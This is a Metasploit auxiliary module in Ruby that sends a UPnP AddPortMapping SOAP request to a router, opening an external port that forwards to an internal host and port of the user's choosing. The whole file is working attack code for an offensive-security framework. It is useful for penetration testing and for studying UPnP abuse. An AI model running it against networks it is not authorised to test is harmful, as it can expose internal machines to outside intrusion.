##
# encoding: utf-8
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'UPnP AddPortMapping',
      'Description'    => 'UPnP AddPortMapping SOAP request',
      'Author'         => 'St0rn <fabien@anbu-pentest.com>',
      'License'        => MSF_LICENSE
    )
    register_options(
      [
        OptString.new('TARGETURI', [true, 'UPnP control URL', '/' ]),
        OptString.new('INTERNAL_CLIENT', [true, 'New Internal Client']),
        OptEnum.new('PROTOCOL', [true, 'Transport level protocol to map', 'TCP', %w(TCP UDP)]),
        OptInt.new('INTERNAL_PORT', [true, 'New Internal Port']),
        OptInt.new('EXTERNAL_PORT', [true, 'New External Port'])
      ],
      self.class
    )
  end

  def setup
    @protocol = datastore['PROTOCOL']
  end

  def run
    content = "<?xml version=\"1.0\"?>"
    content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    content << "<SOAP-ENV:Body>"
    content << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
    content << "<NewPortMappingDescription>New Port Mapping</NewPortMappingDescription>"
    content << "<NewLeaseDuration>3600</NewLeaseDuration>"
    content << "<NewInternalClient>#{datastore['INTERNAL_CLIENT']}</NewInternalClient>"
    content << "<NewEnabled>1</NewEnabled>"
    content << "<NewExternalPort>#{datastore['EXTERNAL_PORT']}</NewExternalPort>"
    content << "<NewRemoteHost></NewRemoteHost>"
    content << "<NewProtocol>#{@protocol}</NewProtocol>"
    content << "<NewInternalPort>#{datastore['INTERNAL_PORT']}</NewInternalPort>"
    content << "</m:AddPortMapping>"
    content << "</SOAP-ENV:Body>"
    content << "</SOAP-ENV:Envelope>"
    res = send_request_cgi(
      'uri'           => normalize_uri(target_uri.path),
      'method'        => 'POST',
      'content-type'  => 'text/xml;charset="utf-8"',
      'data'          => content,
      'headers'       => {
        'SoapAction'  => 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'
      }
    )

    if res
      if res.code == 200
        print_good("#{peer} successfully mapped")
      else
        print_error("#{peer} failed to map #{res}")
      end
    else
      print_error("#{peer} no response")
    end
  end
end
